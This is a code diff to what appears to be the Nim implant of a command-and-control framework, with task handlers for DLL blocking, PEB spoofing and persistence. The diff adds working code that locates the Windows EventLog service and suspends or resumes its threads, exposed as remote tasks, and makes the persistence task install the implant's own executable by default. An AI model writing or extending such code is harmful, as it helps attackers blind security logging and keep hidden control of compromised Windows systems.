@@ -554,6 +554,39 @@ when defined(windows):
       return "SetProcessMitigationPolicy failed (err " & $GetLastError() & ")"
     return if enable: "[+] BLOCKDLLS enabled" else: "[+] BLOCKDLLS disabled"
 
+  proc getServicePid(name: string): DWORD =
+    let hScm = OpenSCManagerW(nil, nil, SC_MANAGER_ENUMERATE_SERVICE)
+    if hScm == 0: return 0
+    defer: CloseServiceHandle(hScm)
+    let wname = newWideCString(name)
+    let hSvc = OpenServiceW(hScm, wname, SERVICE_QUERY_STATUS)
+    if hSvc == 0: return 0
+    defer: CloseServiceHandle(hSvc)
+    var needed: DWORD = 0
+    var buf: array[256, byte]
+    discard QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
+      cast[LPBYTE](addr buf[0]), DWORD(sizeof(buf)), addr needed)
+    return cast[ptr SERVICE_STATUS_PROCESS](addr buf[0]).dwProcessId
+
+  proc doEventlogSuspendResume(suspend: bool): string =
+    let pid = getServicePid("EventLog")
+    if pid == 0: return "[-] EventLog service not found or not running"
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
+    if snap == INVALID_HANDLE_VALUE: return "[-] CreateToolhelp32Snapshot failed"
+    defer: CloseHandle(snap)
+    var te: THREADENTRY32; te.dwSize = DWORD(sizeof(te))
+    var count = 0
+    if Thread32First(snap, addr te).bool:
+      while true:
+        if te.th32OwnerProcessID == pid:
+          let th = OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32ThreadID)
+          if th != 0:
+            if suspend: discard SuspendThread(th) else: discard ResumeThread(th)
+            CloseHandle(th); count += 1
+        if not Thread32Next(snap, addr te).bool: break
+    let action = if suspend: "suspended" else: "resumed"
+    return fmt"[+] {action} {count} threads of EventLog (PID {pid})"
+
   proc doPebSpoof(newPath: string): string =
     if newPath.len == 0: return "empty path"
     var pbi: PROCESS_BASIC_INFORMATION; var retLen: ULONG = 0
@@ -1356,18 +1389,18 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     try:
       let j = parseJson(args)
       let name = j{"name"}.getStr("Updater")
-      let cmd  = j{"cmd"}.getStr()
+      let cmdRaw = j{"cmd"}.getStr()
+      let cmd = if cmdRaw != "": cmdRaw else: getAppFilename()
       let meth = j{"method"}.getStr(when defined(windows): "registry" else: "cron")
-      if cmd == "": t.sendResult(id, "", "PERSIST requires cmd"); return
       t.sendResult(id, doPersist(name, cmd, meth), "")
     except: t.sendResult(id, "", "persist: " & getCurrentExceptionMsg())
 
   of "PERSIST_RM":
     try:
-      let j = parseJson(args)
-      let name = j{"name"}.getStr()
+      let j = if args.len > 0 and args[0] == '{': parseJson(args)
+              else: parseJson("{\"name\":\"" & args.strip() & "\"}")
+      let name = j{"name"}.getStr(if args.strip() != "": args.strip() else: "Updater")
       let meth = j{"method"}.getStr(when defined(windows): "registry" else: "cron")
-      if name == "": t.sendResult(id, "", "PERSIST_RM requires name"); return
       t.sendResult(id, doPersistRm(name, meth), "")
     except: t.sendResult(id, "", "persist_rm: " & getCurrentExceptionMsg())
 
@@ -1723,6 +1756,14 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "BLOCKDLLS":
     when defined(windows): t.sendResult(id, doBlockDlls(args.strip().toLowerAscii() != "off"), "")
     else: t.sendResult(id, "", "BLOCKDLLS: not supported on Linux")
+
+  of "EVENTLOG_SUSPEND":
+    when defined(windows): t.sendResult(id, doEventlogSuspendResume(true), "")
+    else: t.sendResult(id, "", "EVENTLOG_SUSPEND: not supported on Linux")
+
+  of "EVENTLOG_RESUME":
+    when defined(windows): t.sendResult(id, doEventlogSuspendResume(false), "")
+    else: t.sendResult(id, "", "EVENTLOG_RESUME: not supported on Linux")
 
   of "PEB_SPOOF":
     when defined(windows):
